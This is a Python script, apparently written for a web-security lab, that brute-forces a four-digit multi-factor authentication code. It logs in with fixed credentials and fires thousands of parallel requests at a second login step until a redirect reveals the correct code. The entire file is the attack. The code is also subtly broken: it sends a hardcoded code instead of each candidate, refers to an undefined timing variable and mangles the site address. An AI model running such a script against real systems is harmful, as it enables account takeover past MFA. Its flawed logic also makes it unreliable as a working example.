import sys, requests, multiprocessing, time, threading
from bs4 import BeautifulSoup

site = sys.argv[1]

if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

login_url = f'https://{site}/login'
login2_url = f'https://{site}/login2'


multiCPUProc = 20

class myThread1 (threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.count = counter
    def run(self):
        print ("Starting " + self.name) 
        getMulti(1)
        print("Exiting " + self.name)

    

#Taken from getUrls_multiprocessing.py and adapted for this functionality
def time_decorator(func):
  """
  Takes a function and returns a version of it that prints out the elapsed time for executing it
  :param func: Function to decorate
  :return: Function which outputs execution time
  :rtype: Function
  """
  def inner(*args, **kwargs):
      s = time.perf_counter()
      return_vals = func(*args, **kwargs)
      elapsed = time.perf_counter() - s
      print(f'Function returned: {return_vals}')
      return(elapsed)
  return(inner)

# Sets up multiprocessing so this can be solved quickly and more efficiently
@time_decorator
def getMulti(iteration):
    proc = multiprocessing.Pool(multiCPUProc)
    manager = multiprocessing.Manager()
    event = manager.Event()

    auth_code = []
    if iteration == 1:
        for i in range(0, 5000):
            auth_code.append('%04d' % i)
        
        for i in range(5000):
            proc.apply_async(attack_auth, (auth_code[i], event))
    if iteration == 2:
        auth_code2 = auth_code
        for i in range(5000, 10000):
            auth_code2.append('%04d' % i)

        for i in range(5000):
            proc.apply_async(attack_auth, (auth_code2[i], event))
    proc.close()

    event.wait()
    proc.terminate()


#Does the bascic login functionality that was given in Code labs
def login_user(s):
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')

    logindata = {
    'csrf' : csrf,
    'username' : 'carlos',
    'password' : 'montoya'
    }
    
    # print(f'Logging in as carlos:montoya')
    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')
    # print(f'Login response: {resp.text}')

    return csrf

#Checks if the Auth Code given from get_multi is correct or not. If it is not correct than it tries the next code
def attack_auth(auth_code, event):
    s = requests.Session()

    csrf = login_user(s)

    login2data = {
        'csrf' : csrf,
        'mfa-code' : 5850
    }

    resp = s.post(login2_url, data=login2data, allow_redirects=False)
    if resp.status_code == 200:
        print(f'   +{auth_code} INCORRECT')
    if resp.status_code == 302:
        print('==============================')
        print(f'== CORRECT CODE: {auth_code} ==')
        print('==============================')
        event.set()
if __name__ == '__main__':
    thread1 = myThread1(1, "Thread-1", 1)
    thread2 = myThread1(2, "Thread-2", 2)

    thread1.start()
    thread2.start()
    print(f'Time: {time_elapsed:0.2f} seconds')

    